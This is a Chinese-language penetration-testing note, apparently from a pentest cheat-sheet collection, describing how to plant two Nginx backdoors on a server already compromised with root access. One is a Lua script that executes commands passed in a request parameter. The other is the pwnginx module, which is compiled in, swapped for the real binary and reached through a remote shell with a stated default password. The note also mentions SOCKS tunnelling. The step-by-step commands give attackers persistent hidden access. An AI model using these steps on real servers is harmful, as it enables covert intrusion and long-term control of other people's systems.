  #### Nginx Lua后门
	From:https://github.com/netxfly/nginx_lua_security
	https://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md
	后门利用的前提是获取到root权限，nginx安装有lua模块。
	在nginx.conf中http节处添加，指定lua脚本位置，以及nginx启动时加载的脚本
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/641.png)

	在lua目录/waf/中新建Init.lua，内容如下，require nginx表示加载nginx.lua中的模块。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/642.png)

	/waf/目录中新建nginx.lua实现执行命令，参数为waf。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/643.png)

	在nginx配置文件中加入location。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/644.png)

	效果：
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/645.png)
  #### PwnNginx
	From:https://github.com/t57root/pwnginx
	解压好后编译客户端
	>make
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/646.png)

	编辑nginx的源文件/src/core/nginx.c找到configure arguments:在后面添加--prefix=/usr/local/nginx\n指定的是nginx安装的目录
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/647.png)

	重新编译nginx添加后门模块
	>./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/648.png)
	
	>make
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/649.png)

	覆盖新的nginx到原nginx目录
	>cp -f objs/nginx /usr/local/nginx/sbin/nginx
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/650.png)

	重启nginx
	>killall nginx&/usr/local/nginx/sbin/nginx
	连接
	>./pwnginx shell 目标机 nginx端口 密码
	默认密码是t57root，密码的配置文件在pwnginx-master\module\config.h文件夹中，可在重新编译nginx前修改密码
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/651.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/652.png)

	此后门也可开启socks隧道